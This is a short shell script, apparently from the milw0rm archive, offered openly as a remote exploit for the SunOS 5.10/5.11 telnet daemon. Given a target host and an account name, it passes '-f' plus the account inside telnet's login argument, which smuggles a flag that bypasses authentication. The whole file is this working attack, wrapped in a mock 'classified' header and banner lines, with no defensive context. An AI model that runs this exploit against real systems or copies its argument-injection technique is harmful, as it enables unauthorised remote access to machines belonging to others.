#!/bin/sh
# CLASSIFIED CONFIDENTIAL SOURCE MATERIAL
#
# *********************ATTENTION********************************
# THIS CODE _MUST NOT_ BE DISCLOSED TO ANY THIRD PARTIES
# (C) COPYRIGHT Kingcope, 2007
#
################################################################
echo ""
echo "SunOS 5.10/5.11 in.telnetd Remote Exploit by Kingcope kingcope@gmx.net"
if [ $# -ne 2 ]; then
echo "./sunos <host> <account>"
echo "./sunos localhost bin"
exit
fi
echo ""
echo "ALEX ALEX"
echo ""
telnet -l"-f$2" $1

# milw0rm.com [2007-02-11]
